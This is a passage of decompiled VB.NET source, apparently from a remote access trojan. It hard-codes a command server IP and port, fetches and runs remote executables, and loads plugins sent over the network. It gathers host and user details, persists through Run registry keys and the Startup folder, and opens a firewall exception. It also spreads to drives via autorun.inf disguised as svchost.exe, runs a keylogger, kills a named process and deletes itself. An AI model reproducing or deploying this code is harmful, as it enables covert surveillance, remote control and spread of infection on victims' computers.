											While Not((OK.PLG IsNot Nothing) Or (num4 = 20) Or Not OK.Cn)
												num4 += 1
												Thread.Sleep(1000)
											End While
											flag2 = (OK.PLG Is Nothing) Or Not OK.Cn
											If flag2 Then
												Return
											End If
										End If
										Dim array16 As Object() = New Object() { b }
										Dim array17 As Boolean() = New Boolean() { True }
										NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(OK.PLG), Nothing, "ind", array16, Nothing, Nothing, array17, True)
										flag2 = array17(0)
										If flag2 Then
											b = CType(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array16(0)))), GetType(Byte())), Byte())
										End If
									Else
										flag2 = Operators.CompareString(text, "PLG", False) = 0
										If flag2 Then
											Dim memoryStream6 As MemoryStream = New MemoryStream()
											Dim length4 As Integer = (array(0) + OK.Y).Length
											memoryStream6.Write(b, length4, b.Length - length4)
											OK.PLG = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(OK.ZIP(memoryStream6.ToArray()), "A"))))
											NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(OK.PLG), Nothing, "H", New Object() { OK.H }, Nothing, Nothing)
											NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(OK.PLG), Nothing, "P", New Object() { OK.P }, Nothing, Nothing)
											NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(OK.PLG), Nothing, "c", New Object() { OK.C }, Nothing, Nothing)
										End If
									End If
								Else
									Dim array18 As Byte() = Nothing
									flag2 = array(1)(0) = ChrW(31)
									If flag2 Then
										Try
											Dim memoryStream7 As MemoryStream = New MemoryStream()
											Dim length5 As Integer = (array(0) + OK.Y).Length
											memoryStream7.Write(b, length5, b.Length - length5)
											array18 = OK.ZIP(memoryStream7.ToArray())
											GoTo IL_15BE
										Catch ex11 As Exception
											OK.Send("MSG" + OK.Y + "Update ERROR")
											OK.Send("bla")
											Return
										End Try
									End If
									Dim webClient3 As WebClient = New WebClient()
									Try
										array18 = webClient3.DownloadData(array(1))
									Catch ex12 As Exception
										OK.Send("MSG" + OK.Y + "Update ERROR")
										OK.Send("bla")
										Return
									End Try
									IL_15BE:
									OK.Send("bla")
									Dim text16 As String = Path.GetTempFileName() + ".exe"
									Try
										OK.Send("MSG" + OK.Y + "Updating To " + New FileInfo(text16).Name)
										Thread.Sleep(2000)
										File.WriteAllBytes(text16, array18)
										Process.Start(text16, "..")
									Catch ex13 As Exception
										Dim ex14 As Exception = ex13
										OK.Send("MSG" + OK.Y + "Update ERROR " + ex14.Message)
										Return
									End Try
									OK.UNS()
								End If
							End If
						End If
					End If
				End If
			Catch ex15 As Exception
				Dim ex16 As Exception = ex15
				Dim flag2 As Boolean = array.Length > 0 AndAlso ((Operators.CompareString(array(0), "Ex", False) = 0) Or (Operators.CompareString(array(0), "PLG", False) = 0))
				If flag2 Then
					OK.PLG = Nothing
				End If
				Try
					OK.Send(String.Concat(New String() { "ER", OK.Y, array(0), OK.Y, ex16.Message }))
				Catch ex17 As Exception
				End Try
			End Try
		End Sub

		' Token: 0x06000030 RID: 48 RVA: 0x00004668 File Offset: 0x00002868
		Public Shared Function inf() As String
			Dim text As String = "ll" + OK.Y
			Dim flag As Boolean
			Try
				flag = Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(OK.GTV("vn", "")), "", False)
				If flag Then
					Dim text2 As String = text
					Dim text3 As String = OK.DEB(OK.VN) + "_" + OK.HWD()
					text = text2 + OK.ENB(text3) + OK.Y
				Else
					Dim text4 As String = text
					Dim text3 As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV("vn", "")))
					Dim text5 As String = OK.DEB(text3) + "_" + OK.HWD()
					text = text4 + OK.ENB(text5) + OK.Y
				End If
			Catch ex As Exception
				Dim text6 As String = text
				Dim text5 As String = OK.HWD()
				text = text6 + OK.ENB(text5) + OK.Y
			End Try
			Try
				text = text + Environment.MachineName + OK.Y
			Catch ex2 As Exception
				text = text + "??" + OK.Y
			End Try
			Try
				text = text + Environment.UserName + OK.Y
			Catch ex3 As Exception
				text = text + "??" + OK.Y
			End Try
			Try
				text = text + OK.LO.LastWriteTime.[Date].ToString("yy-MM-dd") + OK.Y
			Catch ex4 As Exception
				text = text + "??-??-??" + OK.Y
			End Try
			text = text + "" + OK.Y
			Try
				text += OK.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win")
			Catch ex5 As Exception
				text += "??"
			End Try
			text += "SP"
			Try
				Dim array As String() = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, CompareMethod.Binary)
				flag = array.Length = 1
				If flag Then
					text += "0"
				End If
				text += array(array.Length - 1)
			Catch ex6 As Exception
				text += "0"
			End Try
			Try
				flag = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")
				If flag Then
					text = text + " x64" + OK.Y
				Else
					text = text + " x86" + OK.Y
				End If
			Catch ex7 As Exception
				text += OK.Y
			End Try
			flag = OK.Cam()
			If flag Then
				text = text + "Yes" + OK.Y
			Else
				text = text + "No" + OK.Y
			End If
			text = String.Concat(New String() { text, OK.VR, OK.Y, "..", OK.Y, OK.ACT(), OK.Y })
			Dim text7 As String = ""
			Try
				For Each text8 As String In OK.F.Registry.CurrentUser.CreateSubKey("Software\" + OK.RG, RegistryKeyPermissionCheck.[Default]).GetValueNames()
					flag = text8.Length = 32
					If flag Then
						text7 = text7 + text8 + ","
					End If
				Next
			Catch ex8 As Exception
			End Try
			Return text + text7
		End Function

		' Token: 0x06000031 RID: 49 RVA: 0x00004AF4 File Offset: 0x00002CF4
		<MethodImpl(MethodImplOptions.NoInlining)>
		Public Shared Sub INS()
			Thread.Sleep(1000)
			Dim flag As Boolean = OK.Idr AndAlso Not OK.CompDir(OK.LO, New FileInfo(Interaction.Environ(OK.DR).ToLower() + "\" + OK.EXE.ToLower()))
			If flag Then
				Try
					File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden)
					flag = File.Exists(Interaction.Environ(OK.DR) + "\" + OK.EXE)
					If flag Then
						File.Delete(Interaction.Environ(OK.DR) + "\" + OK.EXE)
					End If
					File.Copy(OK.LO.FullName, Interaction.Environ(OK.DR) + "\" + OK.EXE, True)
					Process.Start(Interaction.Environ(OK.DR) + "\" + OK.EXE)
					ProjectData.EndApp()
				Catch ex As Exception
					ProjectData.EndApp()
				End Try
			End If
			Try
				Interaction.Shell(String.Concat(New String() { "netsh firewall add allowedprogram """, OK.LO.FullName, """ """, OK.LO.Name, """ ENABLE" }), AppWinStyle.Hide, False, -1)
			Catch ex2 As Exception
			End Try
			flag = OK.Isu
			If flag Then
				Try
					OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).SetValue(OK.RG, """" + OK.LO.FullName + """ ..")
				Catch ex3 As Exception
				End Try
				Try
					OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).SetValue(OK.RG, """" + OK.LO.FullName + """ ..")
				Catch ex4 As Exception
				End Try
			End If
			flag = OK.IsF
			If flag Then
				Try
					File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden)
					File.Copy(OK.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\" + OK.RG + ".exe", True)
					OK.FS = New FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\" + OK.RG + ".exe", FileMode.Open)
				Catch ex5 As Exception
				End Try
			End If
			flag = OK.anti2
			If flag Then
				Interaction.Shell("taskkill /F /IM " + OK.anti, AppWinStyle.Hide, False, -1)
			End If
			flag = OK.HD
			If flag Then
				Try
					File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden)
				Catch ex6 As Exception
				End Try
			End If
			flag = OK.usb
			If flag Then
				Dim text As String = "autorun.inf"
				Dim text2 As String = OK.usbx
				Dim fileAttributes As FileAttributes = FileAttributes.Hidden
				Dim text3 As String = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles
				Dim logicalDrives As String() = Directory.GetLogicalDrives()
				For Each text3 As String In logicalDrives
					Try
						File.Copy(Application.ExecutablePath, text3 + text2)
						File.SetAttributes(text3 + text2, fileAttributes)
					Catch ex7 As Exception
					End Try
					Try
						Dim streamWriter As StreamWriter = New StreamWriter(text3 + "\" + text)
						streamWriter.WriteLine("[autorun]")
						streamWriter.WriteLine("open=" + text3 + text2)
						streamWriter.WriteLine("shellexecute=" + text3, 1)
						streamWriter.Close()
						File.SetAttributes(text3 + text, fileAttributes)
					Catch ex8 As Exception
					End Try
				Next
			End If
		End Sub

		' Token: 0x06000032 RID: 50 RVA: 0x00004F78 File Offset: 0x00003178
		<MethodImpl(MethodImplOptions.NoInlining)>
		Public Shared Sub ko()
			Dim flag As Boolean = Interaction.Command() <> Nothing
			If flag Then
				Try
					OK.F.Registry.CurrentUser.SetValue("di", "!")
				Catch ex As Exception
				End Try
				Thread.Sleep(5000)
			End If
			Dim flag2 As Boolean = False
			OK.MT = New Mutex(True, OK.RG, flag2)
			flag = Not flag2
			If flag Then
				ProjectData.EndApp()
			End If
			OK.INS()
			flag = Not OK.Idr
			If flag Then
				OK.EXE = OK.LO.Name
				OK.DR = OK.LO.Directory.Name
			End If
			Dim thread As Thread = AddressOf OK.RC
			thread.Start()
			Try
				OK.kq = New kl()
				Dim thread2 As Thread = AddressOf OK.kq.WRK
				thread2.Start()
			Catch ex2 As Exception
			End Try
			flag = OK.task
			If flag Then
				Dim mgr As mgr = New mgr()
				Dim thread3 As Thread = AddressOf mgr.protect
				thread3.Start()
			End If
			Dim num As Integer = 0
			Dim text As String = ""
			flag = OK.BD
			If flag Then
				Try
					AddHandler SystemEvents.SessionEnding, AddressOf OK.im
					OK.pr(1)
				Catch ex3 As Exception
				End Try
			End If
			While True
				Thread.Sleep(1000)
				flag = Not OK.Cn
				If flag Then
					text = ""
				End If
				Application.DoEvents()
				Try
					num += 1
					flag = num = 5
					If flag Then
						Try
							Process.GetCurrentProcess().MinWorkingSet = CType(1024, IntPtr)
						Catch ex4 As Exception
						End Try
					End If
					flag = num >= 8
					If flag Then
						num = 0
						Dim text2 As String = OK.ACT()
						flag = Operators.CompareString(text, text2, False) <> 0
						If flag Then
							text = text2
							OK.Send("act" + OK.Y + text2)
						End If
					End If
					flag = OK.Isu
					If flag Then
						Try
							Dim flag3 As Boolean = Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(OK.F.Registry.CurrentUser.GetValue(OK.sf + "\" + OK.RG, "")), """" + OK.LO.FullName + """ ..", False)
							If flag3 Then
								OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).SetValue(OK.RG, """" + OK.LO.FullName + """ ..")
							End If
						Catch ex5 As Exception
						End Try
						Try
							Dim flag3 As Boolean = Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(OK.F.Registry.LocalMachine.GetValue(OK.sf + "\" + OK.RG, "")), """" + OK.LO.FullName + """ ..", False)
							If flag3 Then
								OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).SetValue(OK.RG, """" + OK.LO.FullName + """ ..")
							End If
						Catch ex6 As Exception
						End Try
					End If
				Catch ex7 As Exception
				End Try
			End While
		End Sub

		' Token: 0x06000033 RID: 51 RVA: 0x000053D8 File Offset: 0x000035D8
		Public Shared Function md5(B As Byte()) As String
			B = New MD5CryptoServiceProvider().ComputeHash(B)
			Dim text As String = ""
			For Each b As Byte In B
				text += b.ToString("x2")
			Next
			Return text
		End Function

		' Token: 0x06000034 RID: 52
		Private Declare Function NtSetInformationProcess Lib "ntdll" (hProcess As IntPtr, processInformationClass As Integer, ByRef processInformation As Integer, processInformationLength As Integer) As Integer

		' Token: 0x06000035 RID: 53 RVA: 0x00005430 File Offset: 0x00003630
		Public Shared Function Plugin(b As Byte(), c As String) As Object
			Dim modules As [Module]() = Assembly.Load(b).GetModules()
			Dim num As Integer = 0
			Dim [module] As [Module]
			Dim type As Type
			Dim num2 As Integer = modules.Length - 1
			Dim num3 As Integer = num
			While True
				Dim num4 As Integer = num3
				Dim num5 As Integer = num2
				If num4 > num5 Then
					GoTo Block_3
				End If
				[module] = modules(num3)
				Dim types As Type() = [module].GetTypes()
				Dim num6 As Integer = 0
				Dim num7 As Integer = types.Length - 1
				Dim num8 As Integer = num6
				While True
					Dim num9 As Integer = num8
					num5 = num7
					If num9 > num5 Then
						Exit For
					End If
					type = types(num8)
					Dim flag As Boolean = type.FullName.EndsWith("." + c)
					If flag Then
						GoTo Block_1
					End If
					num8 += 1
				End While
				num3 += 1
			End While
			Block_1:
			Return [module].Assembly.CreateInstance(type.FullName)
			Block_3:
			Return Nothing
		End Function

		' Token: 0x06000036 RID: 54 RVA: 0x000054CC File Offset: 0x000036CC
		Public Shared Sub pr(i As Integer)
			Try
				OK.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, i, 4)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000037 RID: 55 RVA: 0x00005514 File Offset: 0x00003714
		Public Shared Sub RC()
			' The following expression was wrapped in a checked-statement
			While True
				OK.lastcap = ""
				Dim flag As Boolean = OK.C IsNot Nothing
				Dim flag2 As Boolean
				If flag Then
					Dim num As Long = -1L
					Dim num2 As Integer = 0
					Try
						While True
							num2 += 1
							flag = num2 = 10
							If flag Then
								num2 = 0
								Thread.Sleep(1)
							End If
							flag = Not OK.Cn
							If flag Then
								Exit For
							End If
							flag = OK.C.Available < 1
							If flag Then
								OK.C.Client.Poll(-1, SelectMode.SelectRead)
							End If
							While True
								IL_7E:
								flag = OK.C.Available > 0
								If Not flag Then
									GoTo IL_23B
								End If
								flag2 = num = -1L
								If flag2 Then
									Dim text As String = ""
									While True
										Dim num3 As Integer = OK.C.GetStream().ReadByte()
										Select Case num3
											Case -1
												GoTo IL_D8
											Case 0
												num = Conversions.ToLong(text)
												flag2 = num = 0L
												If flag2 Then
													OK.Send("")
													num = -1L
												End If
												flag2 = OK.C.Available <= 0
												If flag2 Then
													GoTo Block_11
												End If
												GoTo IL_7E
											Case Else
												text += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(num3).ToString()))
										End Select
									End While
									GoTo IL_15B
								End If
								GoTo IL_15B
							End While
							Block_11:
							Continue For
							IL_15B:
							OK.b = New Byte(OK.C.Available + 1 - 1 + 1 - 1) {}
							Dim num4 As Long = num - OK.MeM.Length
							flag2 = CLng(OK.b.Length) > num4
							If flag2 Then
								OK.b = New Byte(CInt((num4 - 1L)) + 1 - 1 + 1 - 1) {}
							End If
							Dim num5 As Integer = OK.C.Client.Receive(OK.b, 0, OK.b.Length, SocketFlags.None)
							OK.MeM.Write(OK.b, 0, num5)
							flag2 = OK.MeM.Length = num
							If flag2 Then
								num = -1L
								Dim thread As Thread = AddressOf OK.im
								thread.Start(OK.MeM.ToArray())
								thread.Join(100)
								OK.MeM.Dispose()
								OK.MeM = New MemoryStream()
							End If
						End While
						IL_D8:
						IL_23B:
					Catch ex As Exception
					End Try
				End If
				Do
					IL_251:
					Try
						flag2 = OK.PLG IsNot Nothing
						If flag2 Then
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(OK.PLG), Nothing, "clear", New Object(-1) {}, Nothing, Nothing, Nothing, True)
							OK.PLG = Nothing
						End If
					Catch ex2 As Exception
					End Try
					OK.Cn = False
					flag2 = Not OK.connect()
				Loop While flag2
				OK.Cn = True
				Continue For
				GoTo IL_251
			End While
		End Sub

		' Token: 0x06000038 RID: 56 RVA: 0x00005818 File Offset: 0x00003A18
		Public Shared Function SB(ByRef S As String) As Byte()
			Return Encoding.UTF8.GetBytes(S)
		End Function

		' Token: 0x06000039 RID: 57 RVA: 0x00005838 File Offset: 0x00003A38
		Public Shared Function Send(S As String) As Boolean
			Return OK.Sendb(OK.SB(S))
		End Function

		' Token: 0x0600003A RID: 58 RVA: 0x00005858 File Offset: 0x00003A58
		Public Shared Function Sendb(b As Byte()) As Boolean
			Dim flag As Boolean = Not OK.Cn
			Dim flag2 As Boolean
			If flag Then
				flag2 = False
			Else
				Try
					Dim lo As FileInfo = OK.LO
					Dim fileInfo As FileInfo = lo
					SyncLock fileInfo
						flag = Not OK.Cn
						If flag Then
							Return False
						End If
						Dim memoryStream As MemoryStream = New MemoryStream()
						Dim text As String = b.Length.ToString() + vbNullChar
						Dim array As Byte() = OK.SB(text)
						memoryStream.Write(array, 0, array.Length)
						memoryStream.Write(b, 0, b.Length)
						OK.C.Client.Send(memoryStream.ToArray(), 0, CInt(memoryStream.Length), SocketFlags.None)
					End SyncLock
				Catch ex As Exception
					Try
						flag = OK.Cn
						If flag Then
							OK.Cn = False
							OK.C.Close()
						End If
					Catch ex2 As Exception
					End Try
				End Try
				flag2 = OK.Cn
			End If
			Return flag2
		End Function

		' Token: 0x0600003B RID: 59 RVA: 0x00005994 File Offset: 0x00003B94
		Public Shared Function STV(n As String, t As Object, typ As RegistryValueKind) As Boolean
			Dim flag As Boolean
			Try
				OK.F.Registry.CurrentUser.CreateSubKey("Software\" + OK.RG).SetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(t))), typ)
				flag = True
			Catch ex As Exception
				flag = False
			End Try
			Return flag
		End Function

		' Token: 0x0600003C RID: 60 RVA: 0x00005A14 File Offset: 0x00003C14
		<MethodImpl(MethodImplOptions.NoInlining)>
		Public Shared Sub UNS()
			OK.pr(0)
			OK.Isu = False
			Try
				File.SetAttributes(Application.ExecutablePath, FileAttributes.Normal)
			Catch ex As Exception
			End Try
			Try
				OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).DeleteValue(OK.RG, False)
			Catch ex2 As Exception
			End Try
			Try
				OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).DeleteValue(OK.RG, False)
			Catch ex3 As Exception
			End Try
			Try
				Interaction.Shell("netsh firewall delete allowedprogram """ + OK.LO.FullName + """", AppWinStyle.Hide, False, -1)
			Catch ex4 As Exception
			End Try
			Try
				Dim flag As Boolean = OK.FS IsNot Nothing
				If flag Then
					File.SetAttributes(Application.ExecutablePath, FileAttributes.Normal)
					OK.FS.Dispose()
					File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\" + OK.RG + ".exe")
				End If
			Catch ex5 As Exception
			End Try
			Try
				OK.F.Registry.CurrentUser.OpenSubKey("Software", True).DeleteSubKey(OK.RG, False)
			Catch ex6 As Exception
			End Try
			Try
				File.SetAttributes(Application.ExecutablePath, FileAttributes.Normal)
				Interaction.Shell("cmd.exe /k ping 0 & del """ + OK.LO.FullName + """ & exit", AppWinStyle.Hide, False, -1)
			Catch ex7 As Exception
			End Try
			ProjectData.EndApp()
		End Sub

		' Token: 0x0600003D RID: 61 RVA: 0x00005C3C File Offset: 0x00003E3C
		Public Shared Function ZIP(B As Byte()) As Byte()
			Dim memoryStream As MemoryStream = New MemoryStream(B)
			Dim gzipStream As GZipStream = New GZipStream(memoryStream, CompressionMode.Decompress)
			Dim array As Byte() = New Byte(3) {}
			memoryStream.Position = memoryStream.Length - 5L
			memoryStream.Read(array, 0, 4)
			Dim num As Integer = BitConverter.ToInt32(array, 0)
			memoryStream.Position = 0L
			Dim array2 As Byte() = New Byte(num - 1 + 1 - 1 + 1 - 1) {}
			gzipStream.Read(array2, 0, num)
			gzipStream.Dispose()
			memoryStream.Dispose()
			Return array2
		End Function

		' Token: 0x04000006 RID: 6
		Public Shared TIP As String

		' Token: 0x04000007 RID: 7
		Public Shared Tport As String

		' Token: 0x04000008 RID: 8
		Public Shared delay As Integer

		' Token: 0x04000009 RID: 9
		Public Shared udp As Boolean

		' Token: 0x0400000A RID: 10
		Private Shared b As Byte() = New Byte(5120) {}

		' Token: 0x0400000B RID: 11
		Public Shared BD As Boolean = Conversions.ToBoolean("False")

		' Token: 0x0400000C RID: 12
		Public Shared C As TcpClient = Nothing

		' Token: 0x0400000D RID: 13
		Public Shared Cn As Boolean = False

		' Token: 0x0400000E RID: 14
		Public Shared DR As String = "TEMP"

		' Token: 0x0400000F RID: 15
		Public Shared EXE As String = "server.exe"

		' Token: 0x04000010 RID: 16
		Public Shared F As Computer = New Computer()

		' Token: 0x04000011 RID: 17
		Public Shared FS As FileStream

		' Token: 0x04000012 RID: 18
		Private Shared H As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.MH(OK.HH)))))

		' Token: 0x04000013 RID: 19
		Public Shared HH As String = "46.183.187.61"

		' Token: 0x04000014 RID: 20
		Public Shared Idr As Boolean = Conversions.ToBoolean("False")

		' Token: 0x04000015 RID: 21
		Public Shared IsF As Boolean = Conversions.ToBoolean("False")

		' Token: 0x04000016 RID: 22
		Public Shared Isu As Boolean = Conversions.ToBoolean("False")

		' Token: 0x04000017 RID: 23
		Public Shared kq As kl = Nothing

		' Token: 0x04000018 RID: 24
		Private Shared lastcap As String = ""

		' Token: 0x04000019 RID: 25
		Public Shared LO As FileInfo = New FileInfo(Assembly.GetEntryAssembly().Location)

		' Token: 0x0400001A RID: 26
		Private Shared MeM As MemoryStream = New MemoryStream()

		' Token: 0x0400001B RID: 27
		Public Shared MT As Object = Nothing

		' Token: 0x0400001C RID: 28
		Public Shared NH As Integer = 0

		' Token: 0x0400001D RID: 29
		Public Shared P As String = "5555"

		' Token: 0x0400001E RID: 30
		Public Shared PLG As Object = Nothing

		' Token: 0x0400001F RID: 31
		Public Shared RG As String = "822c5c045dfa46fa500f93b3de876374"

		' Token: 0x04000020 RID: 32
		Public Shared sf As String = "Software\Microsoft\Windows\CurrentVersion\Run"

		' Token: 0x04000021 RID: 33
		Public Shared sizk As String = "20"

		' Token: 0x04000022 RID: 34
		Public Shared VN As String = "SGFjS2Vk"

		' Token: 0x04000023 RID: 35
		Public Shared VR As String = "im523"

		' Token: 0x04000024 RID: 36
		Public Shared Y As String = "|'|'|"

		' Token: 0x04000025 RID: 37
		Public Shared HD As Boolean = Conversions.ToBoolean("False")

		' Token: 0x04000026 RID: 38
		Public Shared anti As String = "Exsample.exe"

		' Token: 0x04000027 RID: 39
		Public Shared anti2 As Boolean = Conversions.ToBoolean("False")

		' Token: 0x04000028 RID: 40
		Public Shared usb As Boolean = Conversions.ToBoolean("False")

		' Token: 0x04000029 RID: 41
		Public Shared usbx As String = "svchost.exe"

		' Token: 0x0400002A RID: 42
		Public Shared task As Boolean = Conversions.ToBoolean("False")

		' Token: 0x0400002B RID: 43
		Public Shared mg As mgr = Nothing
	End Class
End Namespace
